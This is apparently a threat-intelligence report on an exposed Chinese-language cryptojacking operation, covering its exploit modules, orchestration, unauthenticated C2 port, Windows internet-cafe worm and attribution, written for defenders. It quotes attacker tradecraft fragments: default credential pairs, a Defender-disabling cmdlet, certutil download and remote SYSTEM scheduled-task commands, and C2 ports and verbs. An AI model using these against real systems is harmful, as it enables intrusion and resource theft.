OmniHunter is architecturally distinct from the main dispatcher, embedding its exploit functions in tuples with `rce_*` naming where the dispatcher uses a dictionary and `ex_*` naming. Its v3-to-v3.1 step upgraded Kibana, Grafana and Nacos from detect-only checks to full RCE. The v4 orchestrator on node 2 is a 10-module engine covering XXL-Job, the Docker API, Redis, Metabase (CVE-2023-38646), Yonyou-NC, Hikvision, Confluence (CVE-2022-26134), and a Weaver EMobile H2 SQL RCE, with JeecgBoot and SpringBoot present only as explicit detect-only stubs whose own comments say full exploitation needs Java class generation they have not written.

By the standards of this kit, v4's exploit code is careful. It runs five JNDI obfuscation variants against the dispatcher's three, a dozen injection paths against seven, target verification before firing Spring4Shell rather than the dispatcher's blind fire, and a distinct webshell filename. And yet it carries exactly the same class of integration bug. Its Metabase reverse-shell sub-payload base64-encodes a bash reverse shell with the literal placeholder `{VPS_IP}` never substituted, so that payload can never connect, while the miner sub-payload right beside it interpolates its own placeholder correctly and works. Careful in the parts the operator understood, broken in the same careless way everywhere the wiring mattered.

Note the boundary on what was read here. The node-2 `omnihunter.py` is a sibling of the v4 that actually ran; the deployed `/opt/omnihunter_v4.py` lives off the served path and was never captured, and OmniHunter v1 and v2 are untraced on either host. The module set above is DEFINITE for the captured sibling and only inferred for the running deployment.

</details>

### 8.4 Orchestration and self-healing

This is the one place in the whole operation where the operator's competence is unambiguous, and it is worth saying plainly because so much of the rest is not. An hourly cron conductor, `auto_scan_v7.sh`, runs the re-exploitation and discovery pipelines side by side with separate timeouts, dedupes owned hosts against the target list, and deliberately restarts itself every hour. When this file surfaced it genuinely changed my read of the operator. Finding it was the moment the scattered pieces resolved into one designed system, and it raised my estimate of them, in this one narrow place, from someone leaning on borrowed exploits to someone who understood how to keep a fleet-scale operation running. That upward revision was never retracted, and it sits beside three separate downward ones, which is the whole shape of the operator (Section 11).

<details markdown="1" class="hl-teardown">
<summary>Why the orchestrator and the watchdog are the competent core</summary>

The tell in `auto_scan_v7.sh` is that the hourly restart is not superstition. The operator's own comment beside it reads `防内存泄漏/挂死`, "prevent memory leak / hang", meaning they diagnosed a real failure mode in their own long-running pipelines and engineered a blunt but effective mitigation around it. It launches the re-hit pipeline against known hits and the discovery pipeline against new targets concurrently, each under its own timeout, and it is what confirmed the deployed v4 orchestrator's path even though that file was never captured.

The self-healing daemon, `watchdog2.py`, is the second piece of genuine engineering. It scrapes the status dashboard for dead-worker rows, looks up each dead worker's original infecting vulnerability in the hit file, and re-runs the dispatcher's own exploit functions against it by importing the dispatcher as a module, tracking which hosts it has already retried to avoid loops, on a 15-second cycle. That is real module reuse and real automation. An earlier script had left the redeployment step as an empty stub; the watchdog is the operator going back and finishing the job properly. Whatever else this operator got wrong, the systems-and-orchestration layer was built by someone who knew what they were doing.

</details>

### 8.5 The C2 stack and an unauthenticated control port

Node 2 runs the interactive side of the operation, a reverse-shell stack that catches shells on a fixed set of ports, auto-pushes an `id` command the moment a shell connects, and exposes an operator control plane. The most mature listener drives that control plane on port 9997, and it is plaintext with no authentication at all. A `list` verb enumerates every caught shell, an `all:` verb broadcasts a command to all of them, and a per-session verb drives one. Anyone who reached that port owned the entire caught-shell pool. I read this as one more data point on the operator's skill level rather than as a dramatic self-inflicted wound, and that is the right register for it; it is of a piece with the world-readable open directories and the hardcoded credentials, an operator indifferent to their own exposure, not a single catastrophic slip.

<details markdown="1" class="hl-teardown">
<summary>The listener set, the control verbs, and what most of the stack keeps hidden</summary>

The mature listener catches reverse shells on ports 4444, 5555, 6666, 7777 and 8888, pushes `id\n` on connect to fingerprint each caught host immediately, and listens for operator commands on port 9997 in cleartext. The verb grammar is `list`, `all:<cmd>`, and `<session>:<cmd>`. There is no key, no token, and no source-address restriction on the control port.

The coverage boundary matters here more than in most sections. Only this one listener was read in full. The co-resident payload server, three other listener variants, and the interactive shell helpers were not captured, so a variant that binds different ports or uses different verbs would not be caught by the fingerprints derived here, and there is no network signature for the control plane itself because the full on-the-wire verb set beyond `list` and `all:` is not known. The three-byte `id\n` auto-push is too short to anchor a network rule without drowning in false positives, so it stays a host-behavior and file signal rather than a Suricata one.

</details>

### 8.6 The Windows worm branch, and the wallet that earned nothing

The Windows branch is branded `凌凯矿机 v3.0` and aimed squarely at internet cafes, and its single most consequential property is that it earned the operator nothing at all. The deployment script's own first comment line reads `网吧全自动挖矿部署 + LAN传播`, "internet-cafe fully-automated mining deployment plus LAN propagation", which is why the internet-cafe victimology is DEFINITE and independent of any branding. The masquerade is competent commodity work, with `xmrig.exe` renamed to `svchost.exe`, installed under an `%APPDATA%` TimeService path, a SYSTEM scheduled task, and hidden-and-system attributes on the directory. LAN spread uses two credential-free methods, a WMI call that pulls a batch file via `certutil` and an admin-share copy with a remote SYSTEM scheduled task, but both ride the current user's token, so propagation only works where that token is already local admin on the target. That is precisely the internet-cafe estate of cloned images, one shared admin account, and flat networks; it is scoped tradecraft, not weak. And because the WMI method re-fetches the batch file from the payload host on every hop rather than copying itself, taking that host offline halts propagation, which is a concrete disruption lever a defender can use.

Both Windows deployment scripts ship a typo'd Monero wallet, an uppercase `FF` where the real address has a lowercase `ff`, and in both the corrupted string reaches the miner's live runtime configuration rather than sitting in a dead display variable. This is DEFINITE and checksum-validated. Every machine infected through the internet-cafe branch mined to an address the operator does not control. Monero pools validate the address at login, so the branch could not have credited the operator with anything. I state that earned-nothing outcome plainly and do not speculate about what the miner client did once the pool rejected it, which is not evidenced. The bug survived because the one-click installer's own banner prints the wallet truncated to its first five characters, `42CTh...`, so the corrupted region never appears in the operator's own output and no amount of watching it run would have revealed it.

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/gocloud-multiservice-cryptojacking-149-28-112-221/windows-branch-invalid-wallet-live-config.png" | relative_url }}" alt="PowerShell source writing the miner's configuration file to disk. Two pool entries are present, one for pool.supportxmr.com on port 443 and one for xmrpool.eu on port 443, and both carry the same user value beginning 42CThVKA9SxeeQDT8EcBK7UHNFFREDw3q with an uppercase FF. The middle of each address is masked. This is the live runtime config, not a comment or a display variable.">
  <figcaption><em>Figure 5: The invalid wallet in the configuration actually written to disk. The uppercase <code>FF</code> is visible in both pool entries, and because this is the live runtime config rather than a display string, every machine infected through this path mined to an address that fails Monero's checksum and credits nobody.</em></figcaption>
</figure>

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/gocloud-multiservice-cryptojacking-149-28-112-221/windows-branch-truncated-wallet-banner.png" | relative_url }}" alt="PowerShell source of the one-click internet-cafe installer. The header comment names it a one-click mining deployment and gives its own usage line as an iex download cradle from the operator's payload host. The wallet variable assignment beginning 42CThVKA9SxeeQDT8EcBK7UHNFF is visible with its middle masked, and the script goes on to download the c3pool installer and pass the wallet variable to it as an argument.">
  <figcaption><em>Figure 6: The same corrupted wallet in the one-click installer, passed straight through to the mining pool's own setup routine. This script's runtime banner prints the address truncated to <code>42CTh...</code>, so the damaged region never appeared in the operator's own output, which is why a fault that cost them the entire branch could run unnoticed.</em></figcaption>
</figure>

The typo itself drew the only light moment in the investigation, and it is worth keeping for what it actually says. It made me laugh a little that attackers hit the same walls defenders do, that a single mis-cased character can quietly undo the whole thing. That is a shared-humanity observation, not a flourish about incompetence. The sober judgment is a separate beat and belongs to the branch as a whole, not the typo. Between a `Stop-Process` that targets every real Windows service host, a download-fallback list that holds the same URL twice, and a comment promising a careful "don't flood" scan sitting directly above a blunt 254-address ping sweep, this is the branch that moved my read of the operator down a third time, to the plain conclusion that they do not really know what they are doing here.

<details markdown="1" class="hl-teardown">
<summary>The checksum proof, and the three self-inflicted defects in the Windows chain</summary>

Both wallet variants were decoded with Monero's block-based base58 and their four-byte trailing checksums recomputed as the first four bytes of Keccak-256 (original Keccak padding, self-tested against the known empty-string vector) over the preceding 65 bytes. Both decode to the standard Monero mainnet network byte, so the typo is a corruption of a real address rather than a different one.

| Variant | Network byte | Checksum in address | Checksum computed | Verdict |
|---|---|---|---|---|
| `…UHN`**`ff`**`REDw3…` (lowercase) | `0x12` (mainnet) | `e914b077` | `e914b077` | VALID |
| `…UHN`**`FF`**`REDw3…` (uppercase) | `0x12` | `e914b077` | `966e18e8` | INVALID, mismatch |

The detail that makes this conclusive rather than merely suggestive is that the invalid string carries the correct address's checksum unchanged, `e914b077` in both rows. That is the signature of a case-corruption inside an already-formed address, not of a second, separately-generated wallet that would carry its own checksum. The uppercase variant recurs across several files on the payload host; in most of them it is a dead display constant, but in the two Windows scripts and the Linux bootstrap it is operationally live.

The three self-inflicted defects in the same chain are of a piece with it. `Stop-Process -Name "svchost" -Force`, run as SYSTEM, matches every genuine Windows service host and can bugcheck the machine the worm has just infected. The download-fallback array meant to provide resilience holds the same payload-host URL twice, so it has no fallback at all. And a comment promising a "quick ARP-based scan, don't flood" sits directly above a sequential ping of all 254 addresses in the subnet at default timeout, which is the opposite of what the comment claims. Two of the Windows files, the worm sweeper and the single-target infection engine, were characterized from the chain rather than read at code level, so their internals are a coverage gap; the deployment and one-click scripts were read directly.

</details>

### 8.7 The dead Log4Shell branch

The branch the campaign was originally named after produced no evidenced victims, and reading its listener explains why. It is a log-only hit-counter, a fake LDAP server that records inbound connections and appends the source addresses to a "confirmed vulnerable" file, plus an HTTP responder that hands back a ten-byte stub rather than a working payload. It counts any connection to the exposed port as proof of exploitation, which means its counts measure scanning traffic, not compromise. Across a continuous run its unique-callback counter never left zero, and its file of 80 "confirmed vulnerable" targets is entirely internet-scanning and cloud infrastructure with not a single Chinese address in it, in a campaign that targets only China.

<details markdown="1" class="hl-teardown">
<summary>What the listener actually recorded, and who was watching the box</summary>

The listener's 80-entry "confirmed vulnerable" file is a roll-call of scanning services and cloud ranges, the kind of infrastructure that connects to any exposed LDAP port as a matter of routine. In a `country="CN"`-scoped campaign, the complete absence of a Chinese address in that file is the tell that it recorded probes rather than victims. The real exploitation server on the same port is off-the-shelf public tooling; the operator's own listener never carried a working payload.

The inbound traffic that the box did attract was itself being profiled. A cluster of hosts, most from a well-known anonymizing exit range, ran a repeating fingerprinting suite that specifically probed the operation's own C2-panel and mining endpoints, so somebody was assessing the box as a likely control panel and mining operation, and both guesses were right. I deliberately do not read this as a dramatic reveal. Anything spraying this many hosts attracts attention, and this operation had been running for some time before it was picked up here, so being watched is the unremarkable consequence of the volume, not an irony. Its one useful analytic consequence is the honeypot hypothesis in Section 5. If researchers were probing the box, some of the operator's recorded "successes" elsewhere may have been honeypots answering, which is one more reason the ledger overcounts.

</details>

## 9. MITRE ATT&CK Mapping
{: .hl-tier-2}

The operation spans ten tactics, and the mapping below is unusually well-grounded because it derives from direct reads of the operator's own code and runtime logs rather than from inferred behavior. For a defender, the techniques that carry the most detection value are the masquerade (T1036.005, `svchost.exe` from `%APPDATA%`), the scheduled-task and systemd persistence (T1053.005, T1543.002), the ingress cradles (T1105, `certutil` and `iex`), the SMB admin-share spread (T1021.002), and the compute-hijacking payload itself (T1496.001). The full table is collapsed below.

<details markdown="1" class="hl-teardown">
<summary>Full Tactic / Technique / Evidence table</summary>

Technique IDs are validated against the current ATT&CK catalog. All rows are HIGH confidence unless explicitly marked `(MODERATE)`; the confidence summary in Section 14 gives the higher-level view.

| Tactic / Technique | Name | Evidence |
|---|---|---|
| Reconnaissance / T1595.002 | Vulnerability Scanning | `scanner.py` / `loop_scan.py` sweeping 27 service classes |
| Reconnaissance / T1596.005 | Scan Databases | `fofa_batch.py` FOFA queries, `country="CN"`, every 3 min |
| Resource Development / T1583.003 | Virtual Private Server | Vultr node 1, Tencent Cloud node 2 |
| Resource Development / T1588.002 | Tool | JNDIExploit / marshalsec, stock XMRig, WinRing0 driver |
| Resource Development / T1588.005 | Exploits | N-day library (CVE-2022-26134, -2023-38646, -2020-14882, -2023-4165) |
| Resource Development / T1608.001 | Upload Malware | `:8080` server hosting `miner.sh` / `xmrig.zip` / `deploy.bat` |
| Initial Access / T1190 | Exploit Public-Facing Application | Dispatcher + OmniHunter; Jenkins `/scriptText`, Confluence OGNL, Redis unauth |
| Initial Access / T1078.001 | Default Accounts | `root:root`, `nacos:nacos`, `admin:Harbor12345`, GitLab `root:5iveL!fe` |
| Execution / T1059.006 | Python | Orchestration layer; `nohup python3 omnihunter.py` |
| Execution / T1059.004 | Unix Shell | `miner.sh`, `setup.sh`, bash reverse-shell payloads |
| Execution / T1059.001 | PowerShell | `winminer.ps1`, `deploy.ps1`, `allinone.ps1`; base64 `-EncodedCommand` |
| Execution / T1059.003 | Windows Command Shell | `deploy.bat`, `setup.bat`, `cmd.bat` |
| Execution / T1059.005 | Visual Basic | `worm.vbs` LAN-propagation loop |
| Execution / T1047 | Windows Management Instrumentation | `deploy.ps1` `Invoke-WmiMethod`; `a.py` `wmic /node:` |
| Persistence / T1053.003 | Cron | `miner.sh` `@reboot`; Redis-injected cron; XXL-Job `0 0 4 * * ?` |
| Persistence / T1053.005 | Scheduled Task | `WinJenkinsHeartbeat`, `WindowsTimeSync`, `WindowsWatchdog` |
| Persistence / T1543.002 | Systemd Service | `c3pool_miner`, `omnihunter`, `vultr-miner-serve` |
| Persistence / T1547.001 | Registry Run Keys | HKLM Run `WindowsWatchdog` to `wscript.exe ...worm.vbs` |
| Privilege Escalation / T1053.005 | Scheduled Task (SYSTEM) | Remote `schtasks ... /ru SYSTEM /f` on LAN spread |
| Defense Evasion / T1562.001 | Disable or Modify Tools | `Set-MpPreference -DisableRealtimeMonitoring` + `%TEMP%` exclusion |
| Defense Evasion / T1036.005 | Match Legitimate Name or Location | `xmrig.exe` to `svchost.exe` under `%APPDATA%\...\TimeService` |
| Defense Evasion / T1564.001 | Hidden Files and Directories | `attrib +H +S`; `/tmp/.X11-unix.` lookalike dir |
| Defense Evasion / T1027.010 | Command Obfuscation | JNDI case/default-value bypass; `p.bat` `$`-token substitution |
| Defense Evasion / T1140 | Deobfuscate/Decode Files | `certutil -urlcache -split`; base64-decoded payloads |
| Defense Evasion / T1070.004 | File Deletion | `deploy.bat` self-delete; `miner.sh` prior-artifact cleanup |
| Discovery / T1046 | Network Service Discovery | FOFA + scanner sweeps; `deploy.ps1` 254-address ping sweep |
| Discovery / T1057 | Process Discovery | `report_miner.sh` competing-miner enumeration |
| Discovery / T1082 | System Information Discovery | `report_miner.sh` host/kernel/cores; `a.py` `systeminfo` |
| Discovery / T1016 | System Network Configuration Discovery | Established-connection enumeration (excluding `:22`) |
| Lateral Movement / T1021.002 | SMB / Windows Admin Shares | `a.py` C$/ADMIN$/IPC$; `deploy.ps1` C$ copy of `svchost.exe` |
| Lateral Movement / T1021.006 | Windows Remote Management | `infect.ps1` WinRM method (MODERATE, characterized not code-read) |
| Lateral Movement / T1570 | Lateral Tool Transfer | Miner copied to admin-share `C$\Windows\Temp\`; `a.py` canary write |
| Command and Control / T1071.001 | Web Protocols | HTTP heartbeat to `:8080`; telemetry to `:8081` |
| Command and Control / T1105 | Ingress Tool Transfer | `curl/wget miner.sh`; `certutil` deploy.bat; XMRig download |
| Command and Control / T1571 | Non-Standard Port | C2 `:4444`, control `:9997`, dashboards `:8888` / `:9998` |
| Command and Control / T1132.001 | Standard Encoding | base64 payloads; URL-encoded heartbeat and telemetry |
| Exfiltration / T1041 | Exfiltration Over C2 Channel | `report_miner.sh` host telemetry to `:8081` (MODERATE, host recon not bulk data) |
| Impact / T1496.001 | Compute Hijacking | XMRig Monero mining; `miner.sh` kills competing miners |

</details>

## 10. Threat Intelligence Context
{: .hl-tier-2}

This context stays tied to what the analysis found. It covers where this operator sits in the documented cryptojacking tier, why its claimed-versus-real gap is a property of that tier rather than a quirk of one actor, why the services it targets never get fixed, and what the whole thing says for a defender deciding where to spend attention.

### 10.1 Where this operator sits in the tier

Measured against the documented named clusters, this operator is **method-typical, scale-below, and unusually well-instrumented**. Every major documented cluster targets by exposed technology at internet scale rather than by victim selection, which is the shared substrate this operator sits inside. SentinelOne documented 8220 Gang expanding to roughly 30,000 infected hosts using internet-wide scanning ([SentinelOne, 2022](https://www.sentinelone.com/blog/from-the-front-lines-8220-gang-massively-expands-cloud-botnet-to-30000-infected-hosts/)); Aqua Nautilus counted more than 75 applications actively exploited by Kinsing ([Aqua Security](https://www.aquasec.com/news/nautilus-reveals-kinsing-attacks/)); Darktrace describes Sysrv-hello as a multi-architecture worm that mines and self-propagates ([Darktrace](https://www.darktrace.com/blog/worm-like-propagation-of-sysrv-hello-crypto-jacking-botnet)); Kaspersky documents Outlaw entering entirely through SSH brute-forcing of weak passwords ([Kaspersky Securelist](https://securelist.com/outlaw-botnet/116444/)); and Unit 42 tracks WatchDog across Docker and Redis ([Unit 42](https://unit42.paloaltonetworks.com/watchdog-cryptojacking/)).

Every technique GOCLOUD uses is standard for that tier, from FOFA-driven discovery and N-day and default-credential exploitation to XMRig through public pools, a worm branch, and self-healing re-deployment. Where it sits below the tier is scale and integration quality, 27 service classes against Kinsing's 75-plus maintained modules, and 7 evidenced hosts against 8220's documented tens of thousands, with a kit full of broken integration. The one dimension where it is above the tier is self-measurement. It built success-checking, telemetry, victim ledgers, a status dashboard, and a re-exploitation daemon, which is more instrumentation than most documented clusters are reported to run, and is precisely why the gap between what it measured and what actually happened is visible at all.

One landscape fact matters directly for how I treat the operator's numbers. Across the documented clusters, only 8220 Gang has a widely-cited aggregate victim number, and even that is a vendor-side estimate rather than an operator claim. Everything else is reported as attempts, geography, or targeted-application breadth. The ecosystem does not publish comparable compromise counts, so an operator's own ledger has no external benchmark to be checked against, and treating it as one is exactly the error the investigation avoided.

### 10.2 The claimed-versus-real gap is a property of the tier

The gap in Section 5 is not this operator's quirk. It is a measurable, repeatable property of opportunistic mass-exploitation, and the reliable way to size a threat like this is to read the success-checking code, not the ledger. This is the report's most defensible novel contribution, and two independent 2026 cases anchor it.

WP-SHELLSTORM, disclosed in mid-2026, is the closest structural twin, an exposed Chinese-language operator server, FOFA-driven targeting, self-branded, with the operator's own logs recovered. Researchers drew the exact distinction this investigation drew, that a target list is not a compromise list. In that case a Joomla flaw was fired at more than 560,000 sites and landed on just 77 ([SOCRadar](https://socradar.io/blog/wp-shellstorm-expose-1-4m-wordpress-sites/); [The Hacker News](https://thehackernews.com/2026/07/exposed-hacker-server-reveals-wp.html)). That 560,000-to-77 ratio is the same collapse GOCLOUD shows, from an independent operation that reached public reporting. The broader measurement literature agrees on the mechanism, that counting infected IPs systematically overestimates true infection counts ([NDSS 2023, CARDCount](https://www.ndss-symposium.org/ndss-paper/how-to-count-bots-in-longitudinal-datasets-of-ip-addresses/)), and that vulnerability scanners rarely verify real exploitability, so a scanner "hit" is routinely a false positive ([Invicti](https://www.invicti.com/blog/web-security/what-vulnerability-scanner-confirms-real-exploits)).

The instructive counter-example is Bissa Scanner, an AI-assisted mass-exploitation operation whose claimed "900-plus confirmed exploits" the DFIR Report found broadly corroborated, because that operator had built genuine confirmed-hit files and alerting ([The DFIR Report](https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/)). Self-reported telemetry is not always inflated; it is inflated when the success check is lax, which is a property of the specific toolkit. WP-SHELLSTORM and GOCLOUD built lax checks; Bissa built a strict one. The lesson for a defender assessing any exposed operator is to read the verification code before trusting the count.

### 10.3 The exposed classes, and why they never get fixed

Every high-volume class in this operator's target set is either a default-credential condition or an N-day with a public proof-of-concept. Not one requires original research. The top of the distribution is unglamorous by design. phpMyAdmin and MySQL are a credentials problem, where a default no-password root account permits file-write to code execution ([NetSPI](https://www.netspi.com/blog/technical-blog/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/)); open MongoDB is a misconfiguration problem, with Shodan's long-running research finding at least 35,000 unauthenticated instances exposed to the internet ([Shodan](https://blog.shodan.io/its-still-the-data-stupid/)); and GitLab is one well-documented N-day, CVE-2021-22205, with public exploit code and in-the-wild abuse recorded by Rapid7 ([Rapid7](https://www.rapid7.com/blog/post/2021/11/01/gitlab-unauthenticated-remote-code-execution-cve-2021-22205-exploited-in-the-wild/)).

The most valuable part of this operator's target set for a Western defender is the Chinese office-automation and ERP software, because that is exactly the surface English-language threat intelligence covers least well. These suites combine enormous installed bases with structurally weak, unauthenticated endpoints and public tooling, and they are exploited from years ago to right now.

<details markdown="1" class="hl-teardown">
<summary>The Chinese OA/ERP surface, grounded product by product</summary>

Scale comes first. Seeyon states its products are used by over 50,000 enterprises and 5,000 government clients ([InvestHK](https://www.investhk.gov.hk/en/our-clients/seeyon-global-ltd/)); Weaver reports serving 70,000 to 80,000 customers ([BleepingComputer](https://www.bleepingcomputer.com/news/security/weaver-e-cology-critical-bug-exploited-in-attacks-since-march/)). These are workflow and HR platforms deployed at the centre of an organization, often internet-facing, and maintained on long upgrade cycles.

The exploitation history runs from old to live. Seeyon A8 carries an unauthenticated arbitrary file write (CVE-2019-25714) that VulnCheck records as exploited in the wild since March 2021, with further authentication-bypass exploitation as recently as October 2025 ([VulnCheck](https://www.vulncheck.com/advisories/seeyon-office-anywhere-oa-a8-unauthenticated-arbitrary-file-write-via-htmlofficeservlet)). Tongda OA carries SQL injection scattered across individual PHP files (CVE-2023-4165 and its sibling), disclosed with public PoCs, where NVD records that the vendor did not respond to disclosure ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-4165)), which is exactly how a vendor produces a long tail of permanently-unpatched N-days. Yonyou and Kingdee carry file-upload and deserialization RCEs with maintained Nuclei detection templates in the public scanner ecosystem, and once a detection template exists the exploitation logic is one short step away. The clearest live case is Weaver E-cology CVE-2026-22679, an unauthenticated RCE actively exploited five days after the patch shipped, against a platform with 70,000-plus customers ([BleepingComputer](https://www.bleepingcomputer.com/news/security/weaver-e-cology-critical-bug-exploited-in-attacks-since-march/)).

Two boundaries are worth stating so the report does not overclaim. Several classes in the operator's set (Harbor, Seafile, Kibana, Grafana, Splunk, Django debug mode, Dahua) could not be resolved to a specific CVE or default-credential condition matching this toolkit's approach, and the investigation separately showed several of those functions to be success-check laxity artefacts rather than working exploits, so no CVE is asserted for them. And no public vulnerability documentation was located for the Xinhu OA blind-SQL-injection technique the operator implemented, so it is described from the code only.

</details>

The consequence is an asymmetry that favors the attacker. Primary documentation for these products lives in Chinese-language sources, while English-language coverage appears only when a flaw reaches Western vendor telemetry or a scanner project. An operator working in Chinese therefore has a richer, faster, better-indexed exploit corpus for these products than a Western defender monitoring them has detection or advisory coverage.

### 10.4 The economics

Realistic revenue is negligible, victim cost is not, and both are true at once. Published benchmarking by Cisco Talos puts the daily Monero yield of an average infected host at a negligible amount ([Talos](https://blog.talosintelligence.com/malicious-xmr-mining/)), so a footprint of 7 evidenced hosts returns very little across a year. The invalid-wallet typo cuts even that to nothing for every machine infected through the Windows branch. Cryptojacked hosts also reboot, get cleaned, and get re-imaged, so sustained yield runs lower still.

The mining pools compound the operator's blindness. C3Pool sets a 0.001 XMR minimum payout and SupportXMR a 0.1 XMR one ([MiningPoolStats](https://miningpoolstats.net/pools/supportxmr/)), thresholds a transient host rarely reaches. The pool therefore reflects aggregate sustained hashrate and gives no per-victim feedback at all, which is part of why the operator built their own unreliable ledgers in the first place.

The victim-facing frame is the one that matters for risk, and it is not the operator's revenue. Sysdig's analysis of cryptojacking economics finds that victims absorb roughly fifty times more in cost than the attacker gains, because the victim pays the compute bill the attacker is stealing ([Sysdig](https://www.sysdig.com/press-releases/sysdig-threat-report-reveals-victims-lose-53-for-every-1-cryptojackers-gain)). An infection that returns the operator almost nothing can still impose a substantial burden on a cloud-hosted victim. That pairing is how "minimal impact for the attacker" and "a real cost to the victim" hold together without contradiction.

### 10.5 Internet-cafe victimology

The internet-cafe target is real and historically proven, but this operator's vector differs from the documented cases in a way worth stating precisely. The best-documented precedent is the 2018 Rui'an operation, in which police arrested suspects who had compromised more than 100,000 internet-cafe machines across 30 Chinese cities and mined cryptocurrency at substantial scale ([CoinDesk](https://www.coindesk.com/markets/2018/06/19/internet-cafes-hacked-to-mine-800k-in-siacoin-cryptocurrency)). The sector is attractive for a concrete reason, because cafes run dense pools of identical, high-specification gaming machines on flat LANs, kept powered on, which is an ideal substrate both for mining and for a worm. But the documented historical cases are insider and maintenance-channel compromises, a human with access installing miners. This operator's branch is a remote worm that self-propagates across the LAN after a foothold. Both exploit the same environmental weakness, and no published campaign was found that matches this operator's specific remote-worm-against-cafes approach, so the precedent establishes the why but not a direct TTP twin.

### 10.6 The foundational-security case

The through-line I kept returning to is the one that should carry this report, that actors at this level are still hunting old vulnerabilities and default credentials, which is precisely why foundational controls matter more than chasing the sophisticated few. The data supports it strongly. The Verizon 2025 DBIR put exploitation of vulnerabilities as an initial-access vector at 20%, up 34% year on year, alongside stolen credentials at 22%, and the 2026 DBIR reports vulnerability exploitation overtaking stolen credentials as the single dominant initial-access vector for the first time in the report's history ([Verizon 2025 DBIR](https://www.verizon.com/business/resources/reports/2025-dbir-data-breach-investigations-report.pdf); [Help Net Security](https://www.helpnetsecurity.com/2026/05/20/verizon-2026-dbir-findings/)). Defenders are losing ground on exactly this class, with the 2026 DBIR showing only 26% of critical CISA KEV vulnerabilities fully remediated, down from 38% the year before. Old CVEs stay exploited for years, with CISA's advisory on 2023's top routinely exploited vulnerabilities naming Log4j the most exploited of all ([CISA AA24-317A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-317a)), and this operator's kit, spanning a 2019 Nexus CVE through 2021-2023 flaws, is a museum of that pattern. Default credentials are named by CISA as a top weakness threat actors exploit ([CISA](https://www.cisa.gov/news-events/alerts/2023/12/15/cisa-secure-design-alert-urges-manufacturers-eliminate-default-passwords)).

The honest complication belongs in the report rather than hidden from it. The same DBIR data shows the sophisticated end growing too, with zero-day exploitation of edge devices and VPNs rising sharply. Both things are true at once. Foundational hygiene, patching known CVEs, eliminating default credentials, and not exposing databases, neutralizes the entire GOCLOUD tier and the large majority of opportunistic volume; a separate, smaller, better-resourced set of threats needs more. The claim the evidence supports is that foundational controls stop the largest volume of what is out there, not that sophistication does not matter, and the argument is strongest kept there.

## 11. Threat Actor Assessment
{: .hl-tier-2}

> **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-020 is an internal tracking designation assigned by The Hunters Ledger to an actor observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports; it is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.

My assessment is that this cannot be attributed to any named actor, and I hold that at INSUFFICIENT, around 15%. No structured catalog or open source links the operation's unique artifacts, the GOCLOUD and OmniHunter self-brands, the FOFA account, the Monero wallet, or the integration-bug signature, to any documented cluster. The actor relationships are empty on VirusTotal, the threat-actor catalog returns nothing for the brands, and the wallet has no prior public reporting. What is missing is any corroborating vendor, government, journalism, or community source naming this activity, or any shared unique artifact with a catalogued group. What would raise the confidence is a future writeup tying the brands, wallet, or FOFA account to a named actor, or reuse of that specific FOFA account against a separately-catalogued campaign.

Around that INSUFFICIENT named-actor result sit several things I can say with much more confidence. I am confident, HIGH at about 85%, that this is a distinct, previously-untracked actor cluster, because two independently-discovered hosts bound by two shared private secrets, a self-contained brand set, and a consistent tooling signature make a coherent, bounded cluster that overlaps nothing tracked. I am confident, HIGH at about 88%, that the actor type is a financially-motivated opportunistic cryptojacking operator, on the Monero monetization, the mass FOFA-driven targeting, the commodity exploit assembly, and the complete absence of espionage or data-theft tooling. I am confident, HIGH at about 85%, that this is a Chinese-language operator, and that rests on native Chinese comments in private tooling never meant to be read, not merely on the Chinese targeting. I reject a state nexus at HIGH, about 90%, because financial motivation, unmodified public-PoC assembly, disposable mainstream hosting, and conspicuously poor OPSEC are all wrong for a state or contractor operation. The one thing I hold only at MODERATE, about 70%, is whether this is one person or a small, process-consistent team; the shared secrets and single umbrella brand point to one hand, while the multi-convention codebase leaves room for a couple of people working together.

<details markdown="1" class="hl-teardown">
<summary>The competing-hypotheses analysis behind the attribution</summary>

Five hypotheses were scored against the diagnostic evidence. They were one untracked Chinese-language cryptojacking operator or small team (H1), two or more unrelated operators sharing a leaked kit (H2), a documented named actor re-skinned under new infrastructure (H3), a state or contractor operation using cryptojacking as cover (H4), and a false flag (H5). H1 carried zero inconsistencies and is the surviving hypothesis. H2 is defeated by the shared private FOFA key and single wallet across both hosts and the single brand and integration-bug signature, none of which unrelated operators would share or converge on. H3 is defeated by the total absence of any prior public link across the unique artifacts, which a re-skinned known actor would leave. H4 and H5 are defeated by the financial motivation, the commodity tradecraft, and the poor OPSEC, and by the fact that a false flag does not bury its misleading language in private code no one was meant to see.

The ruling evidence throughout is the identical private FOFA API key and Monero wallet observed on two independently-discovered hosts, which simultaneously prove single-operator control and, by their absence from any public catalog, defeat the re-skinned-known-actor reading.

</details>

### 11.1 The operator profile, and how the read moved

The profile settled at low-to-mid tier, and the more useful description is non-uniform, genuinely capable in one narrow place, out of their depth nearly everywhere else. That was not a first impression. It was arrived at by accumulation, and it moved four times on evidence, down three times and up exactly once, which is worth walking because the shape of the movement is the finding, not any single endpoint.

Early recon made the operation look simple, roughly what its original Log4Shell-led name implied. Then the MongoDB fix trilogy pushed the read down to an operator iterating past the edge of their own understanding, reaching, with assistance, into an area where they had no skill and never noticing that the payload was in the wrong language. That is a low-to-mid-tier picture, and the failure scale behind it (Nexus at a true 0% across 6,609 attempts, MongoDB at 3% across 7,616) reinforced it.

The read moved up once, and only once, at `auto_scan_v7.sh`. The hourly orchestrator and the self-healing watchdog are the work of someone who genuinely understands how to keep a fleet-scale operation running, down to diagnosing their own memory leak and engineering around it, and finding them was a real high point in the investigation. That upward move was never retracted, and it is the reason the settled profile is not "incompetent" flatly.

